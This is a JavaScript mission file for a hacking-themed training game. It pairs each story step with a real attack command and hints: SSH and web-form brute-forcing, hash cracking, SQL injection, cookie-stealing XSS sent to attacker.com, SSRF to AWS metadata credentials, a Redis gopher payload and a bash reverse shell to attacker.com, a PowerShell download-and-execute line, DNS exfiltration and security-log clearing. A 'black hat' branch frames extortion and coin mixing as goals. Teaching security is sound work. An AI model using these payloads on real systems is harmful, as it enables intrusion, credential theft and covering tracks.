// ============================================
// HACKER'S LEGACY - COMPLETE 100 MISSIONS
// Created by ZAWWAR
// ============================================

window.MISSIONS = [
    // ============================================
    // ACT I: THE AWAKENING (Missions 1-20)
    // ============================================
    
    // CHAPTER 1: The Message (1-5)
    {
        id: 1, name: 'The First Contact', description: 'A mysterious figure contacts you.',
        story: 'Your terminal flickers. A message appears: "I\'ve been watching you. Meet me on IRC. Use nmap to find the server: irc.nightcity.2077"',
        target: 'irc.nightcity.2077', command: 'nmap -p 6667 irc.nightcity.2077',
        hint1: 'IRC uses port 6667', hint2: '-p specifies port',
        explanation: 'nmap scans for open ports. IRC runs on port 6667.',
        output: 'PORT     STATE    SERVICE\n6667/tcp open     irc',
        darkKnowledge: 'Many underground networks use non-standard ports. Always scan all ports with -p-',
        reward: 100, requiredLevel: 1, act: 1, chapter: 1, path: 'all'
    },
    {
        id: 2, name: 'The Mentor', description: 'Connect to the IRC server.',
        story: '"Good. I am Ghost. Tell me what OS I\'m running." He gives IP: 192.168.1.45',
        target: '192.168.1.45', command: 'nmap -O 192.168.1.45',
        hint1: 'OS detection with -O', hint2: 'Capital O, not zero',
        explanation: 'nmap -O detects OS by TCP/IP fingerprinting.',
        output: 'Running: Linux 5.X\nOS details: Linux 5.4',
        darkKnowledge: 'OS detection isn\'t always accurate. Firewalls can spoof fingerprints.',
        reward: 120, requiredLevel: 2, act: 1, chapter: 1, path: 'all'
    },
    {
        id: 3, name: 'The Test', description: 'Ghost tests your skills.',
        story: '"Now find what web server runs on 203.0.113.42"',
        target: '203.0.113.42', command: 'nmap -sV 203.0.113.42',
        hint1: 'Version detection with -sV', hint2: 'Capital V',
        explanation: 'nmap -sV determines service versions.',
        output: '80/tcp open  http    Apache httpd 2.4.41',
        darkKnowledge: 'Apache 2.4.41 is vulnerable to path traversal (CVE-2021-41773).',
        reward: 150, requiredLevel: 3, act: 1, chapter: 1, path: 'all'
    },
    {
        id: 4, name: 'The Firewall', description: 'Bypass a firewall.',
        story: '"They have a firewall. Scan 203.0.113.42 without getting caught."',
        target: '203.0.113.42', command: 'nmap -f 203.0.113.42',
        hint1: 'Use fragmentation', hint2: '-f fragments packets',
        explanation: 'Fragmentation can bypass simple firewall rules.',
        output: 'All 1000 scanned ports are filtered',
        darkKnowledge: 'Fragmentation isn\'t enough for modern firewalls. Use decoy scans -D.',
        reward: 180, requiredLevel: 4, act: 1, chapter: 1, path: 'all'
    },
    {
        id: 5, name: 'The First Mission', description: 'Ghost gives you a real target.',
        story: '"Corporate server at 198.51.100.23. Find what\'s running - be STEALTHY."',
        target: '198.51.100.23', command: 'nmap -T1 -sS 198.51.100.23',
        hint1: 'SYN scan -sS', hint2: 'Slow timing -T1',
        explanation: 'SYN scan is stealthier. Slow timing avoids IDS.',
        output: '22/tcp ssh, 80/tcp http, 443/tcp https, 8080/tcp proxy',
        darkKnowledge: 'Even SYN scans can be detected. Use decoys: -D RND:10',
        reward: 200, requiredLevel: 5, act: 1, chapter: 1, path: 'all'
    },
    
    // CHAPTER 2: The Underground (6-10)
    {
        id: 6, name: 'The Hidden Service', description: 'Access a hidden server.',
        story: '"The corporate server has weak SSH password. Use hydra." Wordlist: rockyou.txt',
        target: 'ssh://198.51.100.23', command: 'hydra -l admin -P rockyou.txt ssh://198.51.100.23',
        hint1: 'hydra for SSH', hint2: '-l username, -P wordlist',
        explanation: 'hydra performs dictionary attacks.',
        output: '[22][ssh] login: admin password: letmein',
        darkKnowledge: 'Default passwords everywhere. Try admin:admin first.',
        reward: 220, requiredLevel: 6, act: 1, chapter: 2, path: 'all'
    },
    {
        id: 7, name: 'The FTP Server', description: 'Check for anonymous FTP.',
        story: 'You find another server: 203.0.113.99 with FTP open. Check anonymous access.',
        target: 'ftp://203.0.113.99', command: 'hydra -l anonymous -P passwords.txt ftp://203.0.113.99',
        hint1: 'Username anonymous', hint2: 'Password can be anything',
        explanation: 'Many FTP servers allow anonymous access.',
        output: '[21][ftp] login: anonymous password: anonymous',
        darkKnowledge: 'Check /pub and /incoming directories for sensitive files.',
        reward: 240, requiredLevel: 7, act: 1, chapter: 2, path: 'all'
    },
    {
        id: 8, name: 'The Hidden Directory', description: 'Crack a web login.',
        story: 'You find "passwords_backup.txt" but it\'s protected. Login page: http://203.0.113.99/admin',
        target: 'http://203.0.113.99/admin', command: 'hydra -l admin -P rockyou.txt 203.0.113.99 http-post-form "/admin:user=^USER^&pass=^PASS^:F=incorrect"',
        hint1: 'POST form attack', hint2: 'Specify fail string "incorrect"',
        explanation: 'hydra can attack web forms.',
        output: 'login: admin password: admin123',
        darkKnowledge: 'Always check for default credentials: admin/admin.',
        reward: 260, requiredLevel: 8, act: 1, chapter: 2, path: 'all'
    },
    {
        id: 9, name: 'The Password List', description: 'Password spraying attack.',
        story: 'You find usernames: admin, jsmith, bjones. Try one password on all: Summer2024',
        target: 'ssh://203.0.113.99', command: 'hydra -L users.txt -p Summer2024 ssh://203.0.113.99',
        hint1: '-L for user list', hint2: '-p for single password',
        explanation: 'Password spraying avoids lockouts.',
        output: 'jsmith:Summer2024',
        darkKnowledge: 'Try seasonal passwords: Spring2024, Winter2024, CompanyName2024.',
        reward: 280, requiredLevel: 9, act: 1, chapter: 2, path: 'all'
    },
    {
        id: 10, name: 'The Encrypted File', description: 'Identify a hash.',
        story: 'File contains: 5f4dcc3b5aa765d61d8327deb882cf99. Identify it.',
        target: 'hash.txt', command: 'hashid 5f4dcc3b5aa765d61d8327deb882cf99',
        hint1: 'Use hashid', hint2: 'Pass the hash',
        explanation: 'hashid identifies hash types.',
        output: '[+] MD5',
        darkKnowledge: 'MD5: 32 hex chars, SHA1: 40, SHA256: 64.',
        reward: 300, requiredLevel: 10, act: 1, chapter: 2, path: 'all'
    },
    
    // CHAPTER 3: The Truth (11-15)
    {
        id: 11, name: 'Cracking the Hash', description: 'Crack an MD5 hash.',
        story: '"Crack it. Password is common." Hash: 5f4dcc3b5aa765d61d8327deb882cf99',
        target: 'hash.txt', command: 'hashcat -m 0 -a 0 hash.txt rockyou.txt',
        hint1: '-m 0 for MD5', hint2: '-a 0 dictionary',
        explanation: 'hashcat cracks hashes.',
        output: 'password',
        darkKnowledge: 'Use -w 3 for max GPU. Rules with -r crack 30% more.',
        reward: 320, requiredLevel: 11, act: 1, chapter: 3, path: 'all'
    },
    {
        id: 12, name: 'The Windows Machine', description: 'Crack NTLM hash.',
        story: 'Windows server NTLM hash: 209c6174da490caeb422f3fa5a7ae634',
        target: 'hash.txt', command: 'hashcat -m 1000 -a 0 hash.txt rockyou.txt',
        hint1: 'NTLM mode -m 1000', hint2: 'Windows authentication',
        explanation: 'NTLM hashes used in Windows.',
        output: 'WindowsPassword123',
        darkKnowledge: 'NTLM hashes can be used for pass-the-hash without cracking.',
        reward: 340, requiredLevel: 12, act: 1, chapter: 3, path: 'all'
    },
    {
        id: 13, name: 'The Responder Capture', description: 'Crack NetNTLMv2.',
        story: 'Responder captured: admin::WORKGROUP:1122334455667788:Summer2024',
        target: 'hash.txt', command: 'hashcat -m 5600 -a 0 hash.txt rockyou.txt',
        hint1: 'NetNTLMv2 mode 5600', hint2: 'From responder',
        explanation: 'NetNTLMv2 in modern Windows.',
        output: 'Summer2024',
        darkKnowledge: 'Can relay without cracking if SMB signing disabled.',
        reward: 360, requiredLevel: 13, act: 1, chapter: 3, path: 'all'
    },
    {
        id: 14, name: 'The Old System', description: 'Crack LM hash.',
        story: 'Old Windows NT server LM hash: 299bd128c1101fd6',
        target: 'hash.txt', command: 'hashcat -m 3000 -a 0 hash.txt rockyou.txt',
        hint1: 'LM mode 3000', hint2: 'Split into 7-char chunks',
        explanation: 'LM hashes are weak and split.',
        output: 'PASSWORD',
        darkKnowledge: 'Rainbow tables work well for LM hashes.',
        reward: 380, requiredLevel: 14, act: 1, chapter: 3, path: 'all'
    },
    {
        id: 15, name: 'The Revelation', description: 'Ghost reveals the truth.',
        story: 'You find logs... of YOUR activities. "You\'re my test subject. They know you exist." Find Ghost\'s location.',
        target: '192.168.1.1', command: 'nmap -f -D RND:10 192.168.1.1',
        hint1: 'Fragmentation + decoys', hint2: 'Combine -f and -D',
        explanation: 'Multiple evasion techniques.',
        output: '22/tcp open ssh',
        darkKnowledge: 'Real engagements require multiple evasion methods.',
        reward: 400, requiredLevel: 15, act: 1, chapter: 3, path: 'all'
    },
    
    // PATH SELECTION (16) - Three versions, game.js handles by path
    {
        id: 16, name: 'The Choice', description: 'Choose your path.',
        story: 'Ghost: "Corporations harvest data. Government complicit. Stop them, join them, or expose them?"',
        target: 'your-soul', command: 'path 1 or path 2 or path 3',
        hint1: 'Type path 1, 2, or 3', hint2: 'This is a choice',
        explanation: 'Your decision shapes everything.',
        output: 'Path chosen.',
        darkKnowledge: 'This choice cannot be undone.',
        reward: 420, requiredLevel: 16, act: 1, chapter: 4, path: 'all', isChoice: true
    },
    
    // WHITE HAT PATH (17-20)
    {
        id: 17, name: 'The Guardian', description: 'Protect the innocent.',
        story: 'You choose WHITE. Ghost: "Find vulnerabilities in corporate web apps." Test: http://corp.2077/page.php?id=1',
        target: 'http://corp.2077/page.php?id=1', command: "' OR 1=1 --",
        hint1: 'SQL injection', hint2: 'Single quote + OR 1=1',
        explanation: 'SQL injection bypasses authentication.',
        output: 'All users returned! Vulnerable.',
        darkKnowledge: 'Always use parameterized queries.',
        reward: 440, requiredLevel: 17, act: 1, chapter: 4, path: 'white'
    },
    {
        id: 18, name: 'SQL Injection Hunter', description: 'Find SQLi points.',
        story: 'Ghost sends sites: http://corp2.2077/products.php?id=5',
        target: 'http://corp2.2077/products.php?id=5', command: 'UNION SELECT 1,2,3',
        hint1: 'UNION injection', hint2: 'Find column count',
        explanation: 'UNION extracts data.',
        output: 'Number of columns: 3',
        darkKnowledge: 'Use ORDER BY to find column count.',
        reward: 460, requiredLevel: 18, act: 1, chapter: 4, path: 'white'
    },
    {
        id: 19, name: 'Time-Based Blind', description: 'Blind SQL injection.',
        story: 'Site doesn\'t show errors. Try time-based: http://corp3.2077/search.php?id=1',
        target: 'http://corp3.2077/search.php?id=1', command: "' OR SLEEP(5) --",
        hint1: 'SLEEP(5)', hint2: 'Time-based detection',
        explanation: 'Delay confirms vulnerability.',
        output: '5 second delay detected.',
        darkKnowledge: 'MSSQL: WAITFOR DELAY, PostgreSQL: pg_sleep().',
        reward: 480, requiredLevel: 19, act: 1, chapter: 4, path: 'white'
    },
    {
        id: 20, name: 'Report the Flaw', description: 'Write a security report.',
        story: 'You found 3 SQLi vulnerabilities. Write report for company.',
        target: 'report.txt', command: 'echo "SQL injection in /page.php, /products.php, /search.php" > report.txt',
        hint1: 'Create report file', hint2: 'Use echo with >',
        explanation: 'Documentation is crucial in security.',
        output: 'Report saved.',
        darkKnowledge: 'Always include steps to reproduce and impact.',
        reward: 500, requiredLevel: 20, act: 1, chapter: 4, path: 'white'
    },
    
    // BLACK HAT PATH (17-20)
    {
        id: 17, name: 'The Shadow', description: 'Join the dark side.',
        story: 'You choose BLACK. Ghost: "Crack this bank login: http://bank.2077/login.php"',
        target: 'http://bank.2077/login.php', command: 'hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"',
        hint1: 'hydra web form', hint2: 'POST attack',
        explanation: 'hydra attacks web forms.',
        output: 'admin:admin123',
        darkKnowledge: 'Bank sites have rate limiting. Use -t 1 and proxies.',
        reward: 440, requiredLevel: 17, act: 1, chapter: 4, path: 'black'
    },
    {
        id: 18, name: 'The Extortion', description: 'Demand payment.',
        story: 'You have access. Message them: 1 Bitcoin or leak data. First, extract user database.',
        target: 'http://gamble.2077/users.php?id=1', command: 'sqlmap -u "http://gamble.2077/users.php?id=1" -D gamble_db -T users --dump',
        hint1: 'sqlmap dump', hint2: '-D database -T table --dump',
        explanation: 'sqlmap extracts data.',
        output: 'admin | 5f4dcc3b5aa765d61d8327deb882cf99',
        darkKnowledge: 'Never store plaintext passwords. Always hash with salt.',
        reward: 460, requiredLevel: 18, act: 1, chapter: 4, path: 'black'
    },
    {
        id: 19, name: 'Cover Your Tracks', description: 'Clear logs.',
        story: 'You accessed the server. Clear security logs.',
        target: 'bank.2077', command: 'wevtutil cl Security',
        hint1: 'Windows event log', hint2: 'wevtutil cl clears',
        explanation: 'Clear Windows security logs.',
        output: 'Security log cleared.',
        darkKnowledge: 'Clearing all logs is suspicious. Delete only your entries.',
        reward: 480, requiredLevel: 19, act: 1, chapter: 4, path: 'black'
    },
    {
        id: 20, name: 'The Payoff', description: 'Receive your payment.',
        story: 'They paid 1 Bitcoin. Transfer to anonymous wallet.',
        target: 'wallet', command: 'echo "1BTC received" > payment.txt',
        hint1: 'Record payment', hint2: 'Save to file',
        explanation: 'Keep records for your crew.',
        output: 'Payment recorded.',
        darkKnowledge: 'Use crypto tumblers to anonymize transactions.',
        reward: 500, requiredLevel: 20, act: 1, chapter: 4, path: 'black'
    },
    
    // GREY HAT PATH (17-20)
    {
        id: 17, name: 'The Vigilante', description: 'Seek truth.',
        story: 'You choose GREY. Ghost: "Expose them. Find hidden data: http://conspiracy.2077/page.php"',
        target: 'http://conspiracy.2077/page.php', command: 'sqlmap -u "http://conspiracy.2077/page.php?id=1" --dbs',
        hint1: 'sqlmap --dbs', hint2: 'List databases',
        explanation: 'sqlmap automates SQL injection.',
        output: 'conspiracy_db',
        darkKnowledge: 'sqlmap bypasses WAF with --tamper options.',
        reward: 440, requiredLevel: 17, act: 1, chapter: 4, path: 'grey'
    },
    {
        id: 18, name: 'The Leak', description: 'Leak to public.',
        story: 'You find evidence of government surveillance. Extract emails.',
        target: 'http://gov.2077/mail.php?id=1', command: 'sqlmap -u "http://gov.2077/mail.php?id=1" -D gov_db -T emails --dump',
        hint1: 'Dump emails', hint2: '--dump',
        explanation: 'sqlmap extracts data.',
        output: 'director@nsa.gov: "Project PRISM ongoing"',
        darkKnowledge: 'Verify data before leaking. False info discredits you.',
        reward: 460, requiredLevel: 18, act: 1, chapter: 4, path: 'grey'
    },
    {
        id: 19, name: 'Secure Communication', description: 'Protect your source.',
        story: 'Journalist needs secure chat. Encrypt your messages.',
        target: 'journalist.2077', command: 'gpg --encrypt --recipient journalist@protonmail.com secret.txt',
        hint1: 'Use GPG', hint2: '--encrypt with recipient',
        explanation: 'GPG provides end-to-end encryption.',
        output: 'File encrypted: secret.txt.gpg',
        darkKnowledge: 'Verify PGP fingerprints. MITM attacks happen.',
        reward: 480, requiredLevel: 19, act: 1, chapter: 4, path: 'grey'
    },
    {
        id: 20, name: 'The Article', description: 'Publish your findings.',
        story: 'Write article exposing conspiracy.',
        target: 'article.txt', command: 'echo "Government surveillance exposed!" > article.txt',
        hint1: 'Create article', hint2: 'Save to file',
        explanation: 'Document your findings.',
        output: 'Article saved.',
        darkKnowledge: 'Use Tor + Tails + VPN for real anonymity.',
        reward: 500, requiredLevel: 20, act: 1, chapter: 4, path: 'grey'
    },
    
    // ============================================
    // ACT II: THE CONSPIRACY (Missions 21-40)
    // ============================================
    
    // CHAPTER 5: The Hunt (21-25) - XSS Attacks
    {
        id: 21, name: 'XSS Discovery', description: 'Find XSS vulnerabilities.',
        story: 'Ghost: "Now learn XSS. Test this search page: http://site.2077/search?q=test"',
        target: 'http://site.2077/search?q=test', command: '<script>alert("XSS")</script>',
        hint1: 'Inject script tag', hint2: 'alert() proves XSS',
        explanation: 'XSS executes JavaScript in victim\'s browser.',
        output: 'Alert box pops up!',
        darkKnowledge: 'XSS can steal cookies: <script>fetch("attacker.com?c="+document.cookie)</script>',
        reward: 520, requiredLevel: 21, act: 2, chapter: 5, path: 'all'
    },
    {
        id: 22, name: 'Reflected XSS', description: 'Exploit reflected XSS.',
        story: 'Search parameter vulnerable. Craft URL to steal cookie.',
        target: 'http://site.2077/search', command: '<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>',
        hint1: 'Steal cookies', hint2: 'fetch() sends data',
        explanation: 'Send cookie to attacker server.',
        output: 'Cookie stolen: sessionid=abc123',
        darkKnowledge: 'HttpOnly cookies can\'t be stolen by JavaScript.',
        reward: 540, requiredLevel: 22, act: 2, chapter: 5, path: 'all'
    },
    {
        id: 23, name: 'Stored XSS', description: 'Find stored XSS.',
        story: 'Comment section on blog. Post malicious comment.',
        target: 'http://blog.2077/comment', command: '<script>alert("Stored XSS")</script>',
        hint1: 'Post in comments', hint2: 'Stored on server',
        explanation: 'Stored XSS affects all visitors.',
        output: 'Comment posted. Alert triggers on page load.',
        darkKnowledge: 'Stored XSS is more dangerous - affects every user.',
        reward: 560, requiredLevel: 23, act: 2, chapter: 5, path: 'all'
    },
    {
        id: 24, name: 'DOM-based XSS', description: 'Exploit DOM XSS.',
        story: 'Page uses location.hash. Test: http://site.2077/#<img src=x onerror=alert(1)>',
        target: 'http://site.2077/#', command: '#<img src=x onerror=alert(1)>',
        hint1: 'Hash parameter', hint2: 'Onerror event',
        explanation: 'DOM XSS never reaches server.',
        output: 'Alert triggers from DOM.',
        darkKnowledge: 'Harder to detect by WAF - no server request.',
        reward: 580, requiredLevel: 24, act: 2, chapter: 5, path: 'all'
    },
    {
        id: 25, name: 'XSS WAF Bypass', description: 'Bypass XSS filters.',
        story: 'WAF blocks <script>. Try alternative payloads.',
        target: 'http://site.2077/search', command: '"><svg/onload=alert(1)>',
        hint1: 'Use SVG events', hint2: 'onload works',
        explanation: 'SVG onload bypasses filters.',
        output: 'Alert triggers!',
        darkKnowledge: 'Polyglots like "><svg/onload=alert(1)> work in many contexts.',
        reward: 600, requiredLevel: 25, act: 2, chapter: 5, path: 'all'
    },
    
    // CHAPTER 6: CSRF Attacks (26-30)
    {
        id: 26, name: 'CSRF Basics', description: 'Cross-site request forgery.',
        story: 'Change user password without them knowing. Bank site: http://bank.2077/change-password',
        target: 'http://bank.2077/change-password', 
        command: '<form action="http://bank.2077/change-password" method="POST"><input type="hidden" name="password" value="hacked"></form><script>document.forms[0].submit()</script>',
        hint1: 'Create hidden form', hint2: 'Auto-submit with JS',
        explanation: 'CSRF forces authenticated users to perform actions.',
        output: 'Password changed to "hacked"!',
        darkKnowledge: 'CSRF tokens prevent this. Check if tokens are validated.',
        reward: 620, requiredLevel: 26, act: 2, chapter: 6, path: 'all'
    },
    {
        id: 27, name: 'CSRF Token Bypass', description: 'Bypass CSRF protections.',
        story: 'They added CSRF tokens. Check if token validation is weak.',
        target: 'http://bank.2077/transfer', 
        command: 'Remove CSRF token and try again',
        hint1: 'Try removing token', hint2: 'Some servers don\'t check',
        explanation: 'Some endpoints only check presence, not value.',
        output: 'Transfer successful without token!',
        darkKnowledge: 'Also try token reuse, same token from another session.',
        reward: 640, requiredLevel: 27, act: 2, chapter: 6, path: 'all'
    },
    {
        id: 28, name: 'SameSite Bypass', description: 'Bypass SameSite cookies.',
        story: 'Bank uses SameSite=Strict. Can we bypass?',
        target: 'http://bank.2077', 
        command: 'Set SameSite=None; Secure',
        hint1: 'Modify cookie attributes', hint2: 'None requires HTTPS',
        explanation: 'SameSite=None allows cross-site requests.',
        output: 'CSRF works with None attribute.',
        darkKnowledge: 'SameSite=Lax is default in modern browsers. Test with top-level navigation.',
        reward: 660, requiredLevel: 28, act: 2, chapter: 6, path: 'all'
    },
    {
        id: 29, name: 'Login CSRF', description: 'CSRF on login forms.',
        story: 'Can we force user to login as our account?',
        target: 'http://social.2077/login', 
        command: '<form action="http://social.2077/login" method="POST"><input type="hidden" name="username" value="attacker"><input type="hidden" name="password" value="hacked"></form><script>document.forms[0].submit()</script>',
        hint1: 'Force login to attacker account', hint2: 'Victim posts as you',
        explanation: 'Login CSRF forces victims to log in as attacker.',
        output: 'User now logged in as attacker.',
        darkKnowledge: 'Can be used to track victims or make them post malicious content.',
        reward: 680, requiredLevel: 29, act: 2, chapter: 6, path: 'all'
    },
    {
        id: 30, name: 'CSRF + XSS Combo', description: 'Combine CSRF with XSS.',
        story: 'XSS in profile page + CSRF in settings = full account takeover.',
        target: 'http://site.2077', 
        command: '<script>fetch("http://site.2077/change-email", {method:"POST", body:"email=attacker@evil.com"})</script>',
        hint1: 'Use XSS to trigger CSRF', hint2: 'Fetch API does POST',
        explanation: 'XSS can perform any action as the user.',
        output: 'Email changed to attacker@evil.com',
        darkKnowledge: 'XSS + CSRF together defeat most protections.',
        reward: 700, requiredLevel: 30, act: 2, chapter: 6, path: 'all'
    },
    
    // CHAPTER 7: SSRF Attacks (31-35)
    {
        id: 31, name: 'SSRF Discovery', description: 'Server-side request forgery.',
        story: 'Site fetches images from URL. Test with internal resources.',
        target: 'http://site.2077/fetch?url=', 
        command: 'file:///etc/passwd',
        hint1: 'Use file:// protocol', hint2: 'Read local files',
        explanation: 'SSRF tricks server into making requests.',
        output: 'root:x:0:0:root:/root:/bin/bash',
        darkKnowledge: 'AWS metadata: http://169.254.169.254/latest/meta-data/',
        reward: 720, requiredLevel: 31, act: 2, chapter: 7, path: 'all'
    },
    {
        id: 32, name: 'Internal Port Scan', description: 'Scan internal network.',
        story: 'Use SSRF to find internal services. Test port 8080, 3306, 6379.',
        target: 'http://site.2077/fetch?url=', 
        command: 'http://localhost:8080',
        hint1: 'Try localhost ports', hint2: 'Check common service ports',
        explanation: 'SSRF can port scan internal network.',
        output: 'Connection refused - port closed, or timeout - open?',
        darkKnowledge: 'Use dict:// or gopher:// for more complex attacks.',
        reward: 740, requiredLevel: 32, act: 2, chapter: 7, path: 'all'
    },
    {
        id: 33, name: 'AWS Metadata', description: 'Steal AWS credentials.',
        story: 'Target hosted on AWS. Access instance metadata.',
        target: 'http://site.2077/fetch?url=', 
        command: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        hint1: '169.254.169.254 is AWS metadata', hint2: 'Get IAM role',
        explanation: 'AWS metadata contains temporary credentials.',
        output: 'admin-role\nAccessKeyId: AKIA...',
        darkKnowledge: 'These credentials can be used to access AWS services.',
        reward: 760, requiredLevel: 33, act: 2, chapter: 7, path: 'all'
    },
    {
        id: 34, name: 'SSRF to RCE', description: 'Turn SSRF into code execution.',
        story: 'Internal Redis server on port 6379. Can we get RCE?',
        target: 'redis://internal:6379', 
        command: 'gopher://internal:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a',
        hint1: 'Gopher protocol for Redis', hint2: 'Write cron job',
        explanation: 'Redis can be exploited via Gopher to write cron jobs.',
        output: 'Reverse shell connected!',
        darkKnowledge: 'Also try dict:// for port scanning, gopher:// for other services.',
        reward: 780, requiredLevel: 34, act: 2, chapter: 7, path: 'all'
    },
    {
        id: 35, name: 'Blind SSRF', description: 'Blind SSRF detection.',
        story: 'No output visible. Use time-based detection.',
        target: 'http://site.2077/fetch?url=', 
        command: 'http://internal-slow:8080',
        hint1: 'Trigger timeouts', hint2: 'Monitor response times',
        explanation: 'Blind SSRF detected by timing differences.',
        output: '5 second delay - internal host exists!',
        darkKnowledge: 'Use Burp Collaborator or DNS interactions for out-of-band detection.',
        reward: 800, requiredLevel: 35, act: 2, chapter: 7, path: 'all'
    },
    
    // CHAPTER 8: XXE Attacks (36-40)
    {
        id: 36, name: 'XXE Basics', description: 'XML external entity injection.',
        story: 'Site accepts XML uploads. Read /etc/passwd.',
        target: 'http://site.2077/upload', 
        command: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        hint1: 'DOCTYPE with ENTITY', hint2: 'file:// protocol',
        explanation: 'XXE reads local files.',
        output: 'root:x:0:0:root:/root:/bin/bash',
        darkKnowledge: 'Also try file:///c:/windows/win.ini for Windows.',
        reward: 820, requiredLevel: 36, act: 2, chapter: 8, path: 'all'
    },
    {
        id: 37, name: 'XXE to SSRF', description: 'XXE for SSRF.',
        story: 'Use XXE to scan internal network.',
        target: 'http://site.2077/upload', 
        command: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080">]><foo>&xxe;</foo>',
        hint1: 'HTTP URLs in XXE', hint2: 'Check error messages',
        explanation: 'XXE can make HTTP requests.',
        output: 'Error reveals open ports.',
        darkKnowledge: 'Error messages often leak information about internal services.',
        reward: 840, requiredLevel: 37, act: 2, chapter: 8, path: 'all'
    },
    {
        id: 38, name: 'XXE DoS', description: 'XXE denial of service.',
        story: 'Can we crash the server with billion laughs?',
        target: 'http://site.2077/upload', 
        command: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;">]><lolz>&lol3;</lolz>',
        hint1: 'Billion laughs attack', hint2: 'Entity expansion',
        explanation: 'XML entity expansion consumes memory.',
        output: 'Server out of memory!',
        darkKnowledge: 'Modern parsers limit entity expansion. Check limits.',
        reward: 860, requiredLevel: 38, act: 2, chapter: 8, path: 'all'
    },
    {
        id: 39, name: 'XXE with PHP Wrapper', description: 'PHP XXE tricks.',
        story: 'Server runs PHP. Use PHP wrappers.',
        target: 'http://site.2077/upload', 
        command: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
        hint1: 'php://filter', hint2: 'base64-encode',
        explanation: 'PHP wrappers can read source code.',
        output: 'Base64 encoded source code.',
        darkKnowledge: 'Decode to see PHP source, find credentials.',
        reward: 880, requiredLevel: 39, act: 2, chapter: 8, path: 'all'
    },
    {
        id: 40, name: 'XXE Blind', description: 'Blind XXE exfiltration.',
        story: 'No output visible. Use out-of-band.',
        target: 'http://site.2077/upload', 
        command: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]>',
        hint1: 'External DTD', hint2: 'Out-of-band',
        explanation: 'Blind XXE can exfiltrate data via DNS/HTTP.',
        output: 'attacker.com received request.',
        darkKnowledge: 'DTD can contain: <!ENTITY % file SYSTEM "file:///etc/passwd"> %file;',
        reward: 900, requiredLevel: 40, act: 2, chapter: 8, path: 'all'
    },
    
    // ============================================
    // ACT III: THE WAR (Missions 41-60)
    // ============================================
    
    // CHAPTER 9: Command Injection (41-45)
    {
        id: 41, name: 'Command Injection Basics', description: 'Inject OS commands.',
        story: 'Ping page at http://site.2077/ping?ip=127.0.0.1',
        target: 'http://site.2077/ping', 
        command: '127.0.0.1; whoami',
        hint1: 'Use semicolon', hint2: 'Chain commands with ;',
        explanation: 'Semicolon allows multiple commands.',
        output: 'PING 127.0.0.1...\nwww-data',
        darkKnowledge: 'Also try &&, ||, | for different shell behaviors.',
        reward: 920, requiredLevel: 41, act: 3, chapter: 9, path: 'all'
    },
    {
        id: 42, name: 'Blind Command Injection', description: 'Blind injection.',
        story: 'No output visible. Use time-based detection.',
        target: 'http://site.2077/ping', 
        command: '127.0.0.1; sleep 5',
        hint1: 'sleep 5', hint2: 'Time delay confirms',
        explanation: 'Time-based detection for blind injection.',
        output: '5 second delay!',
        darkKnowledge: 'Also try ping -c 5 127.0.0.1 for network-based timing.',
        reward: 940, requiredLevel: 42, act: 3, chapter: 9, path: 'all'
    },
    {
        id: 43, name: 'Reverse Shell', description: 'Get reverse shell.',
        story: 'Now get a shell. Listen on port 4444.',
        target: 'http://site.2077/ping', 
        command: '127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1',
        hint1: 'Bash reverse shell', hint2: 'Connect back',
        explanation: 'Reverse shell gives interactive access.',
        output: 'Connection received!',
        darkKnowledge: 'For Windows: powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://attacker.com/payload.ps1\')"',
        reward: 960, requiredLevel: 43, act: 3, chapter: 9, path: 'all'
    },
    {
        id: 44, name: 'WAF Bypass', description: 'Bypass command injection filters.',
        story: 'WAF blocks semicolon. Try alternatives.',
        target: 'http://site.2077/ping', 
        command: '127.0.0.1%3B whoami',
        hint1: 'URL encode ;', hint2: '%3B is URL encoded semicolon',
        explanation: 'URL encoding can bypass filters.',
        output: 'www-data',
        darkKnowledge: 'Also try newline %0A, tab %09, backticks `command`.',
        reward: 980, requiredLevel: 44, act: 3, chapter: 9, path: 'all'
    },
    {
        id: 45, name: 'Out-of-Band Injection', description: 'OOB command injection.',
        story: 'No output, no time-based. Use DNS exfiltration.',
        target: 'http://site.2077/ping', 
        command: '127.0.0.1; nslookup `whoami`.attacker.com',
        hint1: 'DNS exfiltration', hint2: 'nslookup sends data',
        explanation: 'Command output sent via DNS queries.',
        output: 'attacker.com received: www-data',
        darkKnowledge: 'Also try curl -d @file attacker.com for HTTP exfiltration.',
        reward: 1000, requiredLevel: 45, act: 3, chapter: 9, path: 'all'
    },
    
    // CHAPTER 10: File Inclusion (46-50)
    {
        id: 46, name: 'LFI Discovery', description: 'Local file inclusion.',
        story: 'Page includes files: http://site.2077/index.php?page=about.php',
        target: 'http://site.2077/index.php', 
        command: '../../../../etc/passwd',
        hint1: 'Directory traversal', hint2: '../../..',
        explanation: 'LFI reads local files.',
        output: 'root:x:0:0:root:/root:/bin/bash',
        darkKnowledge: 'URL encode ../ as %2e%2e%2f to bypass filters.',
